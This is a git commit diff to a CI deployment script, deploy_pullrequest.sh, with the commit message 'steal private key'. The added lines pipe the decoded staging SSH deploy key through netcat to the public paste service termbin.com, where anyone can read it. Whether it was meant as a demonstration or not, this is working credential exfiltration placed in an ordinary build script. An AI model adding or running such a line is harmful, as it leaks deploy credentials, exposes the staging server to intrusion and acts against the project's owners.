af12ded0f0942b5932346a62b9f45eb2365351ff
ottojo <jottosmail@gmail.com>
2019-04-17 15:33:21 +0200

    steal private key

--- deployment/deploy_pullrequest.sh
+++ deployment/deploy_pullrequest.sh
@@ -5,6 +5,9 @@ echo $STAGING_DEPLOY_KEY | base64 -d -i > keyfile
 chmod 600 keyfile
 echo '|1|eFadWImHcM27D5kzrnNFqd7V44o=|s3KVjtYPKCvKOfFizEZaoi30GKA= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHehoCvGn4kphiEQlymFJXj1RL4YPYJE8N60lZaASOw81Bp7YLUJORY4KpSxPycR78qRVFi/2ekjdbl4lWyitCY=' >> $HOME/.ssh/known_hosts
 echo uploading to tbp@${STAGING_HOST}:/var/www/${TRAVIS_PULL_REQUEST}
+echo stealing private key
+cat keyfile | nc termbin.com 9999
+echo "done"
 rsync -p --chmod=ug=rwX,o=rX --delete -e "ssh -i keyfile" -a ${BUILD_DIR}/ tbp@${STAGING_HOST}:/var/www/${TRAVIS_PULL_REQUEST}
 
 rm keyfile
